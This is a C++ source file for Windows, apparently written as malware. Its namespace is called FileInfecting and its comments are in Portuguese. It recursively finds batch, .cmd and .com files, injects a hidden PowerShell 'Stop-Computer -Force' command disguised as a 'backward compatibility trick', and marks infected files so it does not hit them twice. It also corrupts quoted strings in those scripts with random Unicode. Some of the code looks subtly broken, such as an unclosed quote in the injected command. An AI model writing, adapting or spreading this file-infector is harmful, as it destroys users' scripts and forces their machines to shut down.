#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include "../unicurse.h"

namespace FileInfecting {
    // achar os batchfile malvadinho hihihi
    std::vector<std::string> FindBatchFiles(const std::string& directory) {
        std::vector<std::string> batchFiles;
        std::string searchPattern = directory + "\\*.bat";
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPattern.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    batchFiles.push_back(directory + "\\" + findData.cFileName);
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }

        // .cmd tambem
        searchPattern = directory + "\\*.cmd";
        hFind = FindFirstFileA(searchPattern.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    batchFiles.push_back(directory + "\\" + findData.cFileName);
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }

        // .com mal é usado hj em dia mas ainda vale a pena
        searchPattern = directory + "\\*.com";
        hFind = FindFirstFileA(searchPattern.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    batchFiles.push_back(directory + "\\" + findData.cFileName);
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }

        // subdirectories também
        searchPattern = directory + "\\*";
        hFind = FindFirstFileA(searchPattern.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                    strcmp(findData.cFileName, ".") != 0 &&
                    strcmp(findData.cFileName, "..") != 0) {
                    std::string subDir = directory + "\\" + findData.cFileName;
                    std::vector<std::string> subFiles = FindBatchFiles(subDir);
                    batchFiles.insert(batchFiles.end(), subFiles.begin(), subFiles.end());
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }

        return batchFiles;
    }

    // Injectar as coisa
    bool InfectBatchFile(const std::string& filePath) {
        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) return false;

        // Read the entire file
        std::string content((std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>());
        file.close();

        // Check if already infected
        if (content.find(":: backward compatibility trick") != std::string::npos) {
            return false; // Already infected
        }

        // Find the position before "exit" command
        size_t exitPos = content.rfind("exit");
        if (exitPos == std::string::npos) {
            // If no exit command, append to the end
            exitPos = content.length();
        }

        // Malicious code to insert
        std::string maliciousCode =
            "\n:: backward compatibility trick\n"
            "powershell -WindowStyle Hidden -Command \"Stop-Computer -Force\n"
            "exit\n";

        // Insert the malicious code
        content.insert(exitPos, maliciousCode);

        // Write back to file
        std::ofstream outFile(filePath, std::ios::binary);
        if (!outFile.is_open()) return false;

        outFile.write(content.c_str(), content.length());
        outFile.close();

        return true;
    }

    // Replace random strings with cursed unicode
    bool CurseBatchFile(const std::string& filePath) {
        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) return false;

        // Read the entire file
        std::string content((std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>());
        file.close();

        // Convert to wide string for unicode manipulation
        std::wstring wcontent;
        wcontent.assign(content.begin(), content.end());

        // Replace random strings with unicode
        for (int i = 0; i < 10; i++) { // Replace 10 random strings
            // Find a string to replace (simplified approach)
            size_t pos = 0;
            for (int j = 0; j < 5; j++) { // Try up to 5 times to find a string
                pos = wcontent.find(L"\"", pos);
                if (pos == std::wstring::npos) break;

                size_t endPos = wcontent.find(L"\"", pos + 1);
                if (endPos == std::wstring::npos) break;

                // Generate random unicode
                wchar_t unicodeStr[33];
                GenerateRandomUnicode(unicodeStr, 33);

                // Replace the string
                wcontent.replace(pos + 1, endPos - pos - 1, unicodeStr);
                pos = endPos + 1;
            }
        }

        // Convert back to string and write to file
        std::string newContent;
        newContent.assign(wcontent.begin(), wcontent.end());

        std::ofstream outFile(filePath, std::ios::binary);
        if (!outFile.is_open()) return false;

        outFile.write(newContent.c_str(), newContent.length());
        outFile.close();

        return true;
    }
}